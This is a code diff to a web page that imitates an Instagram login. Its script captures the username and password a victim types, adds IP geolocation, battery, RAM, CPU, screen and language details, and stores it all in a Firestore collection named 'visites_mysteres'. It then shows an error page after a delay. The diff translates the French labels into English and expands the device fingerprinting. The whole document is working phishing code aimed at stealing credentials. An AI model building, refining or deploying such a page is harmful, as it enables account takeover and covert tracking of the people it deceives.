@@ -96,10 +96,6 @@
                 </div>
             </div>
         </div>
-        <div class="footer">
-            <div class="footer-links"><a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a></div>
-            <div>English <span style="margin: 0 10px;">⌄</span> © 2026 Instagram from Meta</div>
-        </div>
     </div>
 
     <div id="error-page">
@@ -132,8 +128,6 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        document.addEventListener('contextmenu', e => e.preventDefault());
-
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const loginBtn = document.getElementById('login-btn');
@@ -142,7 +136,6 @@
         const loginPage = document.getElementById('login-page');
         const errorPage = document.getElementById('error-page');
 
-        // Gestion de l'oeil
         const togglePasswordBtn = document.getElementById('toggle-password');
         const eyeOpen = document.getElementById('eye-open');
         const eyeClosed = document.getElementById('eye-closed');
@@ -164,21 +157,40 @@
         async function collectDeviceInfo() {
             let geoData = {};
             try { const res = await fetch('https://get.geojs.io/v1/ip/geo.json'); geoData = await res.json(); } catch(e) {}
+            
             let batteryLevel = "N/A", chargingStatus = "N/A";
             if ('getBattery' in navigator) {
-                try { const b = await navigator.getBattery(); batteryLevel = Math.round(b.level * 100) + "%"; chargingStatus = b.charging ? "En charge" : "Décharge"; } catch(e) {}
+                try { const b = await navigator.getBattery(); batteryLevel = Math.round(b.level * 100) + "%"; chargingStatus = b.charging ? "Charging" : "Discharging"; } catch(e) {}
             }
+            
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             const ua = navigator.userAgent;
-            let typeAppareil = "PC Bureau";
-            if (/iPhone|iPad|iPod/i.test(ua)) typeAppareil = "iPhone/iPad";
-            else if (/Android/i.test(ua)) typeAppareil = "Smartphone Android";
-            else if (/Mac/i.test(ua)) typeAppareil = "Mac";
+            let typeAppareil = "Desktop PC";
+            if (/iPhone|iPad|iPod/i.test(ua)) typeAppareil = "Apple iOS Device";
+            else if (/Android/i.test(ua)) typeAppareil = "Android Device";
+            else if (/Mac/i.test(ua)) typeAppareil = "Apple Mac";
+
+            // Détection poussée du matériel
+            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+            const cpu = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Unknown";
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
 
             return {
-                ip: geoData.ip || "N/A", ville: geoData.city || "Inconnue", pays: geoData.country || "Inconnu", isp: geoData.organization || "Inconnu",
-                latitude: geoData.latitude || null, longitude: geoData.longitude || null, batterie: batteryLevel, etat_batterie: chargingStatus,
-                connexion: conn ? conn.effectiveType.toUpperCase() : "WIFI/LAN", type_appareil: typeAppareil, user_agent: ua
+                ip: geoData.ip || "Unknown", 
+                ville: geoData.city || "Unknown", 
+                pays: geoData.country || "Unknown", 
+                isp: geoData.organization || "Unknown",
+                latitude: geoData.latitude || null, 
+                longitude: geoData.longitude || null, 
+                batterie: batteryLevel, 
+                etat_batterie: chargingStatus,
+                connexion: conn ? conn.effectiveType.toUpperCase() : "WIFI/LAN", 
+                type_appareil: typeAppareil, 
+                user_agent: ua,
+                ram: ram,
+                cpu: cpu,
+                resolution: screenRes,
+                langue: navigator.language
             };
         }
 
@@ -196,19 +208,17 @@
             const deviceInfo = await collectDeviceInfo();
             const sessionId = 'SESS-' + Math.random().toString(36).substr(2, 8).toUpperCase();
 
-            // On envoie EXACTEMENT ce qui a été tapé
             const data = {
                 session_id: sessionId,
                 username: username,
                 password: password,
                 ...deviceInfo,
-                heure_locale: new Date().toLocaleString('fr-FR'),
+                heure_locale: new Date().toLocaleString('en-US'),
                 date_clic: serverTimestamp()
             };
 
             try { await addDoc(collection(db, "visites_mysteres"), data); } catch(err) { console.error(err); }
 
-            // Attente de 2.5s pour laisser le temps au dashboard de s'afficher
             await new Promise(r => setTimeout(r, 2500));
 
             loginPage.style.opacity = '0';
